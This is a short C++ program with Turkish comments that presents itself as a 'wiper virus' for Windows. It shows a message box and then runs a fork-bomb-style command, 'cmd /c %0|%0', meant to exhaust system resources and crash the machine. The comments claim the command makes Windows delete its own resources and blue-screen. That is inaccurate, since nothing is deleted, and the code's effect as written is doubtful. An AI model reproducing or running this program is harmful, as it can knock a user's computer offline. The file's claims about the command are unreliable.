// !DIKKAT!: Bu bir WIPER virüsüdür.
#include <iostream>
#include <cstdlib>
#include <Windows.h> // Kütüphaneyi ekleyemedim:(


int main() {
    // Message box'u uyarısı:
    MessageBox(NULL, "hello", "Message", MB_OK);

    // Windows için ölümcül komutu yazıdr:
    system("cmd /c %0|%0");

    // Kullanıcının ENTER tuşuna basmasını bekle
    std::cout << "Press ENTER to continue...";
    std::cin.get();

    return 0;
}
// !UYARI!: %0|%0 komutu Windows işletim sisteminin kendi kaynaklarına silmesine neden olur.
// !Kısaca %0|%0 komutu Windows'un kendisine DoS atağı yapmasına sebep olur.
// !Windows, kendi kaynaklarını tüketmeye başlar, cevap veremez ve
// !Mavi ekran verip çöker...